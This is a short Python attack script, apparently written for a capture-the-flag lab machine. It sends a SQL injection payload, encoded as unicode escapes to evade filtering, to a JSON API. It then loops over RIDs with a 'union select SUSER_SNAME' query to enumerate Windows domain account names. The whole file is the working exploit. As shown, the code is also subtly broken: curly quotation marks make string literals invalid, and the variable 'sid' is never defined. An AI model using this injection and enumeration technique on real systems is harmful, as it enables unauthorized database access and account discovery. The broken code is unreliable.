#!/usr/bin/python3

from pwn import * 
import requests, pdb, signal, time, json, sys

def def_handler(sig,frame):
    
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = "http://10.10.10.179/api/getColleagues"
burp = {'http': 'http://127.0.0.1:8080'}

def getUnicode(sqli):

    sqli_unicoded = ""
    
    for character in sqli:
        sqli_unicoded += "\\u00" + hex(ord(character))[2::]
    
    return sqli_unicoded
        

def makeRequest(sqli_unicoded):

    headers = {
        'Content-Type': 'application/json;charset=utf-8'
    }
    post_data = '{"name":"%s"}' % sqli_unicoded

    r = requests.post(main_url, headers=headers, data=post_data)
    data_json = json.loads(r.text)
    return(json.dumps(data_json, indent=4))

def getRID(rid):

    rid_hex = hex(rid).replace(‘x’, ‘’)
    list = []
    for character in rid_hex:
        list.append(character)
    rid = list[2] + list[3] + list[0] + list[1] + “0000”
    return rid

if __name__ == "__main__":
    


    for x in range(1100, 1200):
        rid = getRID(x)
        sqli = “test’ union select 1,(select SUSER_SNAME(%s%s)),3,4,5-- -” % (sid, rid)

        sqli_unicoded = getUnicode(sqli)

        response_json = makeRequest(sqli_unicoded)
        print(response_json)
        time.sleep(1)
